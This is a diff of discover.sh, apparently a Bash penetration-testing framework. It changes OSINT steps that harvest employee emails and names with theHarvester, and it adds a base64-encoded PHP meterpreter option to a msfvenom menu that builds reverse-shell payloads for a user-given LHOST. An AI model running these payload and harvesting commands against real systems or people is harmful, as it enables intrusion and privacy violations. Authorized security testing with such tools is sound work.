@@ -34,7 +34,7 @@ discover=$(updatedb; locate discover.sh | sed 's:/[^/]*$::')
 distro=$(uname -n)
 home=$HOME
 long='========================================================================================================='
-medium='======================================================='
+medium='==============================================================='
 short='========================================'
 
 sip='sort -n -u -t . -k 1,1 -k 2,2 -k 3,3 -k 4,4'
@@ -308,30 +308,37 @@ case $choice in
      echo
 
      echo "theHarvester"
+     # PTF
+     if [ -f /pentest/intelligence-gathering/theharvester/theHarvester.py ]; then
+          theharvester="theHarvester"
+     else
+          theharvester="/usr/share/theharvester/theHarvester.py"
+     fi
+
      echo "     Baidu                (9/$total)"
-     theHarvester -d $domain -b baidu > zbaidu
+     $theharvester -d $domain -b baidu > zbaidu
      echo "     Bing                 (10/$total)"
-     theHarvester -d $domain -b bing > zbing
+     $theharvester -d $domain -b bing > zbing
      echo "     Dogpilesearch        (11/$total)"
-     theHarvester -d $domain -b dogpilesearch > zdogpilesearch
+     $theharvester -d $domain -b dogpilesearch > zdogpilesearch
      echo "     Google               (12/$total)"
-     theHarvester -d $domain -b google > zgoogle
+     $theharvester -d $domain -b google > zgoogle
      echo "     Google CSE           (13/$total)"
-     theHarvester -d $domain -b googleCSE > zgoogleCSE
+     $theharvester -d $domain -b googleCSE > zgoogleCSE
      echo "     Google+              (14/$total)"
-     theHarvester -d $domain -b googleplus | sed 's/ - Google+//g' > zgoogleplus
+     $theharvester -d $domain -b googleplus | sed 's/ - Google+//g' > zgoogleplus
      echo "     Google Profiles	  (15/$total)"
-     theHarvester -d $domain -b google-profiles > zgoogle-profiles
+     $theharvester -d $domain -b google-profiles > zgoogle-profiles
      echo "     Jigsaw               (16/$total)"
-     theHarvester -d $domain -b jigsaw > zjigsaw
+     $theharvester -d $domain -b jigsaw > zjigsaw
      echo "     LinkedIn             (17/$total)"
-     theHarvester -d $domain -b linkedin > zlinkedin
+     $theharvester -d $domain -b linkedin > zlinkedin
      echo "     PGP                  (18/$total)"
-     theHarvester -d $domain -b pgp > zpgp
+     $theharvester -d $domain -b pgp > zpgp
      echo "     Yahoo                (19/$total)"
-     theHarvester -d $domain -b yahoo > zyahoo
+     $theharvester -d $domain -b yahoo > zyahoo
      echo "     All                  (20/$total)"
-     theHarvester -d $domain -b all > zall
+     $theharvester -d $domain -b all > zall
      echo
 
      echo "Metasploit                (21/$total)"
@@ -457,6 +464,7 @@ case $choice in
      fi
 
      echo "dnsdumpster.com           (25/$total)"
+     wget -q https://dnsdumpster.com/static/map/$domain.png -O /tmp/dnsdumpster.png
      wget -q https://dnsdumpster.com/static/map/$domain.png -O $home/data/$domain/images/dnsdumpster.png
 
      # Generate a random cookie value
@@ -592,7 +600,7 @@ case $choice in
 
      ##############################################################
 
-     cat z* | grep "@$domain" | grep -vF '...' | grep -Fv '..' | egrep -v '(%|\*|-|=|\+|\[|\]|\||;|:|"|<|>|/|\?|definetlynot|edward_snowden|fake|fuckthepolice|lastname_firstname|regulations.gov|salessalesandmarketing|toastmasters|www|x.y|xxxxx|yousuck|zxcvbcvxvxcccb)' > tmp
+     cat z* | grep "@$domain" | grep -vF '...' | grep -Fv '..' | egrep -v '(%|\*|-|=|\+|\[|\]|\||;|:|"|<|>|/|\?|,,|definetlynot|edward_snowden|fake|fuckthepolice|lastname_firstname|regulations.gov|salessalesandmarketing|toastmasters|www|x.y|xxxxx|yousuck|zxcvbcvxvxcccb)' > tmp
      # Remove trailing whitespace from each line
      sed 's/[ \t]*$//' tmp > tmp2
      # Remove lines that start with a number
@@ -622,10 +630,10 @@ case $choice in
      # Remove lines that contain a single word
      sed '/[[:blank:]]/!d' tmp6 > tmp7
      # Clean up
-     egrep -v '(~|`|!|@|#|\$|%|\^|&|\*|\(|\)|_|-|\+|=|{|\[|}|]|\|:|;|"|<|>|\.|\?|/|abuse|academy|account|achievement|active|adjuster|admin|advanced|adventure|advertising|alliance|allstate|america|american|analysis|analyst|analytics|antivirus|apple seems|application|applications|architect|article|asian|assistant|associate|association|attorney|auditor|australia|automation|automotive|balance|bank|bbc|beginning|berlin|beta theta|between|big game|billion|bioimages|biometrics|bizspark|breaches|broker|business|buyer|buying|california|cannot|capital|career|carrying|cashing|center|certified|cfi|challenger|championship|change|chapter|charge|china|chinese|claim|clearance|cloud|code|college|columbia|commercial|communications|community|company pages|competition|competitive|compliance|computer|concept|conference|config|connections|connect|construction|consultant|contract|contributor|controllang|cooperation|coordinator|corporation|creative|critical|croatia|crm|dallas|day care|death toll|delta|department|description|designer|design|detection|developer|develop|development|devine|digital|diploma|director|disability|disaster|disclosure|dispute|division|dns|document|dos poc|download|drivers|during|economy|ecovillage|editor|education|effect|electronic|else|emails|embargo|emerging|empower|employment|end user|energy|engineer|enterprise|entertainment|entreprises|entrepreneur|entry|environmental|error page|ethical|example|excellence|executive|expertzone|exploit|facebook|faculty|failure|fall edition|fast track|fatherhood|fbi|federal|filmmaker|finance|financial|forensic|found|freelance|from|frontiers in tax|full|function|fuzzing|germany|get control|global|google|governance|government|graphic|greater|group|guardian|hackers|hacking|harden|harder|hawaii|hazing|headquarters|health|help|history|homepage|hospital|hostmaster|house|how to|hurricane|icmp|idc|in the news|index|inform|innovation|installation|insurers|integrated|international|internet|instructor|insurance|intelligence|interested|investigation|investment|investor|israel|items|japan|job|justice|kelowna|knowing|laptops|leader|letter|licensing|lighting|linkedin|limitless|liveedu|llp|local|looking|ltd|lsu|luscous|macys|malware|managed|management|manager|managing|manufacturing|market|mastering|maturity|md|media|medical|medicine|member|meta tags|methane|metro|microsoft|middle east|mission|mitigation|mn|money|monitor|more coming|mortgage|museums|mutual|negative|network|network|new user|newspaper|new york|next page|nitrogen|nw|nyc|obtain|occupied|offers|office|online|operations|organizational|outbreak|owners|page|partner|pathology|peace|people|perceptions|philippines|photo|picture|places|planning|portfolio|potential|preassigned|preparatory|president|principal|print|private|process|producer|product|professional|professor|profile|project|program|publichealth|published|pyramid|questions|recruiter|redeem|redirect|region|register|registry|regulation|rehab|remote|report|representative|republic|research|resolving|revised|rising|rural health|sales|satellite|save the date|school|scheduling|science|search|searc|sections|secured|security|secretary|secrets|see more|selection|senior|server|service|services|social|software|solutions|source|special|station home|statistics|strategy|student|successful|superheroines|supervisor|support|switch|system|systems|talent|targeted|tax|tcp|technical|technician|technology|tester|textoverflow|theater|time in|tit for tat|title|toolbook|tools|toxic|traditions|trafficking|transfer|transformation|treasury|trojan|twitter|training|ts|tylenol|types of scams|unclaimed|underground|underwriter|university|united states|untitled|verification|vietnam|view|Violent|virginia bar|voice|volkswagen|volume|wanted|web search|web site|website|welcome|west virginia|westchester|when the|whiskey|window|worker|world|www|xbox)' tmp7 > tmp8
+     egrep -v '(~|`|!|@|#|\$|%|\^|&|\*|\(|\)|_|-|\+|=|{|\[|}|]|\|:|;|"|<|>|\.|\?|/|abuse|academy|account|achievement|acquisition|action|active|adjuster|admin|advanced|adventure|advertising|alliance|allstate|ambassador|america|american|analysis|analyst|analytics|animal|antivirus|apple seems|application|applications|architect|archivist|article|assembler|assembling|assembly|asian|assignment|assistant|associate|association|attorney|auditor|australia|automation|automotive|aviation|balance|bank|bbc|beginning|berlin|beta theta|between|big game|billion|bioimages|biometrics|bizspark|breaches|broker|builder|business|buyer|buying|california|cannot|capital|career|carrying|cashing|center|certified|cfi|challenger|championship|change|chapter|charge|chemistry|china|chinese|claim|class|clearance|cloud|cnc|code|cognitive|college|columbia|coming|commercial|communications|community|company pages|competition|competitive|compliance|computer|concept|conference|config|connections|connect|construction|consultant|contact|contract|contributor|control|cooperation|coordinator|corporate|corporation|counsel|creative|critical|croatia|crm|dallas|database|day care|dba|dc|death toll|delivery|delta|department|description|designer|design|destructive|detection|develop|devine|dialysis|digital|diploma|director|disability|disaster|disclosure|dispatch|dispute|distribution|divinity|division|dns|document|dos poc|download|driver|during|economy|ecovillage|editor|education|effect|electronic|else|emails|embargo|emerging|empower|employment|end user|energy|engineer|enterprise|entertainment|entreprises|entrepreneur|entry|environmental|error page|ethical|example|excellence|executive|expertzone|exploit|facebook|facilit|faculty|failure|fall edition|fast track|fatherhood|fbi|federal|fellow|filmmaker|finance|financial|forensic|forklift|found|freelance|from|frontiers in tax|fulfillment|full|function|future|fuzzing|germany|get control|global|google|governance|government|graphic|greater|group|guardian|hackers|hacking|harden|harder|hawaii|hazing|headquarters|health|help|history|homepage|hospital|hostmaster|house|how to|hurricane|icmp|idc|in the news|index|inform|innovation|installation|insurers|integrated|intellectual|international|internet|instructor|insurance|intelligence|interested|investigation|investment|investor|israel|items|japan|job|justice|kelowna|knowing|language|laptops|large|leader|letter|level|liaison|licensing|lighting|linkedin|limitless|liveedu|llp|local|looking|lpn|ltd|lsu|luscous|machinist|macys|malware|managed|management|manager|managing|manufacturing|market|mastering|material|maturity|md|mechanic|media|medical|medicine|member|merchandiser|meta tags|methane|metro|microsoft|middle east|mission|mitigation|mn|money|monitor|more coming|mortgage|museums|mutual|negative|network|network|new user|newspaper|new york|next page|night|nitrogen|nw|nyc|obtain|occupied|offers|office|online|onsite|operations|operator|order|organizational|outbreak|owner|packaging|page|paralegal|partner|pathology|peace|people|perceptions|pharmacist|philippines|photo|picker|picture|placement|places|planning|police|portfolio|postdoctoral|potential|preassigned|preparatory|president|principal|print|private|process|producer|product|professional|professor|profile|project|program|property|publichealth|published|pyramid|quality|questions|rcg|recruiter|redeem|redirect|region|register|registry|regulation|rehab|remote|report|representative|republic|research|resolving|responsable|restaurant|retired|revised|rising|rural health|russia|sales|satellite|save the date|school|scheduling|science|scientist|search|searc|sections|secured|security|secretary|secrets|see more|selection|senior|server|service|services|social|software|solution|source|special|sql|station home|statistics|store|strategy|strength|student|study|substitute|successful|sunoikisis|superheroines|supervisor|support|surveillance|switch|system|systems|talent|targeted|tax|tcp|teacher|teaching|technical|technician|technique|technology|temporary|tester|textoverflow|theater|thought|through|time in|tit for tat|title|toolbook|tools|toxic|traditions|trafficking|transfer|transformation|treasury|trojan|truck|twitter|training|ts|tylenol|types of scams|unclaimed|underground|underwriter|university|united states|untitled|vault|verification|vietnam|view|Violent|virginia bar|voice|volkswagen|volume|vp|wanted|web search|web site|website|welcome|west virginia|westchester|when the|whiskey|window|worker|world|www|xbox|zz)' tmp7 > tmp8
      sed 's/iii/III/g' tmp8 | sed 's/ii/II/g' > tmp9
      # Capitalize the first letter of every word
-     sed 's/\b\(.\)/\u\1/g' tmp9 | sed 's/Mcc/McC/g; s/Mcd/McD/g; s/Mce/McE/g; s/Mcg/McG/g; s/Mci/McI/g; s/Mcl/McL/g; s/Mcn/McN/g; s/,,/,/g' > tmp10
+     sed 's/\b\(.\)/\u\1/g' tmp9 | sed 's/Mca/McA/g; s/Mcb/McB/g; s/Mcc/McC/g; s/Mcd/McD/g; s/Mce/McE/g; s/Mcf/McF/g; s/Mcg/McG/g; s/Mci/McI/g; s/Mck/McK/g; s/Mcl/McL/g; s/Mcm/McM/g; s/Mcn/McN/g; s/Mcs/McS/g; s/,,/,/g' > tmp10
      grep -v ',' tmp10 | awk '{print $2", "$1}' > tmp11
      grep ',' tmp10 > tmp12
      # Remove trailing whitespace from each line
@@ -3812,9 +3820,10 @@ echo "2.  cmd/windows/reverse_powershell"
 echo "3.  linux/x64/shell_reverse_tcp"
 echo "4.  linux/x86/meterpreter/reverse_tcp"
 echo "5.  osx/x64/shell_reverse_tcp"
-echo "6.  windows/meterpreter/reverse_tcp"
-echo "7.  windows/x64/meterpreter/reverse_tcp"
-echo "8.  Previous menu"
+echo "6.  php/meterpreter/reverse_tcp"
+echo "7.  windows/meterpreter/reverse_tcp"
+echo "8.  windows/x64/meterpreter/reverse_tcp"
+echo "9.  Previous menu"
 echo
 echo -n "Choice: "
 read choice
@@ -3824,12 +3833,12 @@ case $choice in
           extention=".apk"
           format="raw"
           arch="dalvik"
-	  platform="android";;
+          platform="android";;
      2) payload="cmd/windows/reverse_powershell"
           extention=".bat"
           format="raw"
           arch="cmd"
-	  platform="windows";;
+          platform="windows";;
      3) payload="linux/x64/shell_reverse_tcp"
           extention=""
           format="elf"
@@ -3841,21 +3850,27 @@ case $choice in
           arch="x86"
           platform="linux";;
      5) payload="osx/x64/shell_reverse_tcp"
-	  extention=""
-	  format="macho"
+          extention=""
+          format="macho"
           arch="x86_64"
           platform="osx";;
-     6) payload="windows/meterpreter/reverse_tcp"
+     6) payload="php/meterpreter/reverse_tcp"
+          extention=".php"
+          format="raw"
+          arch="php"
+          platform="php"
+          encoder="php/base64";;
+     7) payload="windows/meterpreter/reverse_tcp"
           extention=".exe"
           format="exe"
           arch="x86"
           platform="windows";;
-     7) payload="windows/x64/meterpreter/reverse_tcp"
+     8) payload="windows/x64/meterpreter/reverse_tcp"
           extention=".exe"
           format="exe"
           arch="x86_64"
           platform="windows";;
-     8) f_main;;
+     9) f_main;;
      *) f_error;;
 esac
 
@@ -3878,8 +3893,13 @@ if [[ $lport -lt 1 || $lport -gt 65535 ]]; then
      f_error
 fi
 
-echo
-$msfv -p $payload LHOST=$lhost LPORT=$lport -f $format -a $arch --platform $platform -o $home/data/payload-$platform-$arch$extention
+if [[ $payload == "php/meterpreter/reverse_tcp" ]]; then
+     echo
+     $msfv -p $payload LHOST=$lhost LPORT=$lport -f $format -a $arch --platform $platform -o $home/data/payload$extention
+else
+     echo
+     $msfv -p $payload LHOST=$lhost LPORT=$lport -f $format -a $arch --platform $platform -o $home/data/payload-$platform-$arch$extention
+fi
 
 echo
 echo
@@ -3898,9 +3918,10 @@ echo "2.  cmd/windows/reverse_powershell"
 echo "3.  linux/x64/shell_reverse_tcp"
 echo "4.  linux/x86/meterpreter/reverse_tcp"
 echo "5.  osx/x64/shell_reverse_tcp"
-echo "6.  windows/meterpreter/reverse_tcp"
-echo "7.  windows/x64/meterpreter/reverse_tcp"
-echo "8.  Previous menu"
+echo "6.  php/meterpreter/reverse_tcp"
+echo "7.  windows/meterpreter/reverse_tcp"
+echo "8.  windows/x64/meterpreter/reverse_tcp"
+echo "9.  Previous menu"
 echo
 echo -n "Choice: "
 read choice
@@ -3911,9 +3932,10 @@ case $choice in
      3) payload="linux/x64/shell_reverse_tcp";;
      4) payload="linux/x86/meterpreter/reverse_tcp";;
      5) payload="osx/x64/shell_reverse_tcp";;
-     6) payload="windows/meterpreter/reverse_tcp";;
-     7) payload="windows/x64/meterpreter/reverse_tcp";;
-     8) f_main;;
+     6) payload="php/meterpreter/reverse_tcp";;
+     7) payload="windows/meterpreter/reverse_tcp";;
+     8) payload="windows/x64/meterpreter/reverse_tcp";;
+     9) f_main;;
      *) f_error;;
 esac
 
@@ -3975,7 +3997,7 @@ exit
 
 f_updates(){
 # Remove nmap scripts not being used
-ls -l /usr/share/nmap/scripts/ | awk '{print $9}' | cut -d '.' -f1 | egrep -v '(address-info|ajp-auth|ajp-headers|allseeingeye-info|asn-query|auth-owners|auth-spoof|broadcast|brute|citrix-enum-apps-xml|citrix-enum-servers-xml|creds-summary|daap-get-library|discover|dns-brute|dns-check-zone|dns-client-subnet-scan|dns-fuzz|dns-ip6-arpa-scan|dns-srv-enum|dns-nsec3-enum|domcon-cmd|duplicates|eap-info|fcrdns|firewalk|firewall-bypass|ftp-libopie|ftp-libopie|ftp-vuln-cve2010-4221|ganglia-info|hostmap-bfk|hostmap-ip2hosts|hostmap-robtex|http|iax2-version|informix-query|informix-tables|ip-forwarding|ip-geolocation-geobytes|ip-geolocation-geoplugin|ip-geolocation-ipinfodb|ip-geolocation-maxmind|ipidseq|ipv6-node-info|ipv6-ra-flood|ipv6-multicast-mld-list|irc-botnet-channels|irc-info|irc-unrealircd-backdoor|isns-info|jdwp-exec|jdwp-info|jdwp-inject|krb5-enum-users|ldap-novell-getpass|ldap-search|llmnr-resolve|metasploit-info|mmouse-exec|ms-sql-config|mrinfo|ms-sql-hasdbaccess|ms-sql-query|ms-sql-tables|ms-sql-xp-cmdshell|mtrace|murmur-version|mysql-audit|mysql-enum|mysql-dump-hashes|mysql-query|mysql-vuln-cve2012-2122|nat-pmp-info|nat-pmp-mapport|netbus-info|ntp-info|omp2-enum-targets|oracle-enum-users|ovs-agent-version|p2p-conficker|path-mtu|pjl-y-message|quake1-info|quake3-info|quake3-master-getservers|qscan|resolveall|reverse-index|rpc-grind|rpcap-info|rusers|samba-vuln-cve-2012-1182|shodan-api|script|sip-call-spoof|skypev2-version|smb-flood|smb-ls|smb-print-text|smb-psexec|sniffer-detect|snmp-ios-config|socks-open-proxy|sql-injection|ssh-hostkey|ssh2-enum-algos|sshv1|stun-info|teamspeak2-version|targets|tftp-enum|tor-consensus-checker|traceroute-geolocation|unittest|unusual-port|upnp-info|url-snarf|ventrilo-info|vuze-dht-info|weblogic-t3-info|whois|xmlrpc-methods|xmpp-info)' > tmp
+ls -l /usr/share/nmap/scripts/ | awk '{print $9}' | cut -d '.' -f1 | egrep -v '(address-info|ajp-auth|ajp-headers|allseeingeye-info|asn-query|auth-owners|auth-spoof|broadcast|brute|citrix-enum-apps-xml|citrix-enum-servers-xml|creds-summary|daap-get-library|discover|dns-brute|dns-check-zone|dns-client-subnet-scan|dns-fuzz|dns-ip6-arpa-scan|dns-srv-enum|dns-nsec3-enum|domcon-cmd|duplicates|eap-info|fcrdns|firewalk|firewall-bypass|ftp-libopie|ftp-libopie|ftp-vuln-cve2010-4221|ganglia-info|hostmap-bfk|hostmap-ip2hosts|hostmap-robtex|http|iax2-version|informix-query|informix-tables|ip-forwarding|ip-geolocation-geoplugin|ip-geolocation-ipinfodb|ip-geolocation-maxmind|ipidseq|ipv6-node-info|ipv6-ra-flood|ipv6-multicast-mld-list|irc-botnet-channels|irc-info|irc-unrealircd-backdoor|isns-info|jdwp-exec|jdwp-info|jdwp-inject|krb5-enum-users|ldap-novell-getpass|ldap-search|llmnr-resolve|metasploit-info|mmouse-exec|ms-sql-config|mrinfo|ms-sql-hasdbaccess|ms-sql-query|ms-sql-tables|ms-sql-xp-cmdshell|mtrace|murmur-version|mysql-audit|mysql-enum|mysql-dump-hashes|mysql-query|mysql-vuln-cve2012-2122|nat-pmp-info|nat-pmp-mapport|netbus-info|ntp-info|omp2-enum-targets|oracle-enum-users|ovs-agent-version|p2p-conficker|path-mtu|pjl-y-message|quake1-info|quake3-info|quake3-master-getservers|qscan|resolveall|reverse-index|rpc-grind|rpcap-info|rusers|samba-vuln-cve-2012-1182|shodan-api|script|sip-call-spoof|skypev2-version|smb-flood|smb-ls|smb-print-text|smb-psexec|sniffer-detect|snmp-ios-config|socks-open-proxy|sql-injection|ssh-hostkey|ssh2-enum-algos|sshv1|stun-info|teamspeak2-version|targets|tftp-enum|tor-consensus-checker|traceroute-geolocation|unittest|unusual-port|upnp-info|url-snarf|ventrilo-info|vuze-dht-info|weblogic-t3-info|whois|xmlrpc-methods|xmpp-info)' > tmp
 
 grep 'script=' discover.sh | egrep -v '(discover.sh|22.txt|smtp.txt)' | cut -d '=' -f2- | cut -d ' ' -f1 | tr ',' '\n' | egrep -v '(db2-discover|dhcp-discover|dns-service-discovery|http-email-harvest|http-grep|membase-http-info|oracle-sid-brute|smb-os-discovery)' | sort -u > tmp2
 
@@ -4019,7 +4041,7 @@ echo >> tmp-updates
 echo "recon-ng" >> tmp-updates
 echo "==============================" >> tmp-updates
 python /usr/share/recon-ng/recon-cli -M > tmp
-grep '/' tmp | awk '{print $1}' | egrep -iv '(adobe|bozocrack|brute_suffix|cache_snoop|dev_diver|exploitation|gists_search|github_commits|github_dorks|github_users|google_site_web|hashes_org|import|interesting_files|jigsaw|linkedin_auth|locations|mailtester|mangle|metacrawler|migrate_contacts|migrate_hosts|namechk|profiler|pwnedlist|reporting|vulnerabilities)' > tmp2
+grep '/' tmp | awk '{print $1}' | egrep -iv '(adobe|bozocrack|brute_suffix|cache_snoop|dev_diver|exploitation|freegeoip|gists_search|github_commits|github_dorks|github_users|google_site_web|hashes_org|import|interesting_files|ipinfodb|jigsaw|linkedin_auth|locations|mailtester|mangle|metacrawler|migrate_contacts|migrate_hosts|namechk|profiler|pwnedlist|reporting|vulnerabilities)' > tmp2
 cat $discover/resource/recon-ng.rc $discover/resource/recon-ng-active.rc | grep 'use' | grep -v 'query' | awk '{print $2}' | sort -u > tmp3
 diff tmp2 tmp3 | grep '/' | awk '{print $2}' | sort -u >> tmp-updates
 
